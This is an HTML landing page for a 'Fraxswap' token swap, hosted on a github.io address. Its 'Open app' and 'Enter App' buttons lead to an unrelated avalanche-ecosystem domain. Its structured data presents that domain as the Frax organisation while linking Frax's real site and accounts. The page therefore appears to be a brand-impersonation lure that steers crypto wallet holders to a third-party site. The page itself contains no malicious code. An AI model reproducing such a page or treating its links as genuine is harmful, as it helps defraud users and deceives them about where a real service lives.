<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Fraxswap</title>
  <meta name="description" content="Fraxswap swaps FRAX and other tokens from your own wallet on the Frax ecosystem.">
  <link rel="canonical" href="https://fraxswap.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#F4F6FB">
  <meta property="og:type" content="website">
  <meta property="og:title" content="Fraxswap">
  <meta property="og:description" content="Fraxswap swaps FRAX and other tokens from your own wallet on the Frax ecosystem.">
  <meta property="og:url" content="https://fraxswap.github.io/">
  <meta property="og:image" content="https://fraxswap.github.io/og-cover.png">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Fraxswap">
  <meta name="twitter:description" content="Swap FRAX and other tokens from your own wallet on the Frax ecosystem.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <header class="topbar">
    <a class="brand" href="#"><img src="favicon.png" width="28" height="28" alt="" style="border-radius:50%"> Fraxswap</a>
    <nav class="nav" aria-label="Trusted references">
      <a href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
      <a href="https://www.coingecko.com/" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
      <a href="https://ethereum.org/defi/" target="_blank" rel="nofollow noopener noreferrer">DeFi guide</a>
    </nav>
    <span class="sp"></span>
    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <h1>Fraxswap</h1>
    <p class="sub"><strong>Fraxswap</strong> swaps FRAX and other tokens from your own wallet on the Frax ecosystem.</p>

    <section class="card" aria-label="Swap route">
      <div class="route">
        <div class="leg">
          <span class="lbl">From</span>
          <span class="chip">
            <img class="ic" src="frax.png" width="26" height="26" alt="FRAX">
            <span class="t">FRAX</span>
          </span>
        </div>
        <button class="dir" type="button" data-dir aria-label="Switch direction"><span class="ar">&#8594;</span></button>
        <div class="leg">
          <span class="lbl">To</span>
          <span class="chip">
            <img class="ic" src="eth.png" width="26" height="26" alt="ETH">
            <span class="t">ETH</span>
          </span>
        </div>
      </div>
      <a class="act" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
      <p class="note">Preview only &mdash; rates and routes are shown in the app.</p>
    </section>
  </main>

  <footer class="foot">
    <b>Fraxswap</b> &mdash; 2026
  </footer>

  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      { "@type": "WebSite", "@id": "https://avalanche-ecosystem.github.io/#website", "url": "https://avalanche-ecosystem.github.io/", "name": "Fraxswap", "inLanguage": "en" },
      { "@type": "Organization", "@id": "https://avalanche-ecosystem.github.io/#org", "name": "Frax", "url": "https://avalanche-ecosystem.github.io/", "sameAs": ["https://frax.finance/","https://x.com/fraxfinance","https://github.com/FraxFinance"] },
      { "@type": "WebApplication", "@id": "https://avalanche-ecosystem.github.io/#app", "name": "Fraxswap", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "url": "https://avalanche-ecosystem.github.io/", "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" } }
    ]
  }
  </script>

  <script>
  (function(){
    "use strict";
    var root=document, btn=root.querySelector('[data-dir]');
    if(!btn) return;
    btn.addEventListener('click', function(){
      var chips=root.querySelectorAll('.leg .chip');
      if(chips.length>=2){ var t=chips[0].innerHTML; chips[0].innerHTML=chips[1].innerHTML; chips[1].innerHTML=t; }
    });
  })();
  </script>
</body>
</html>
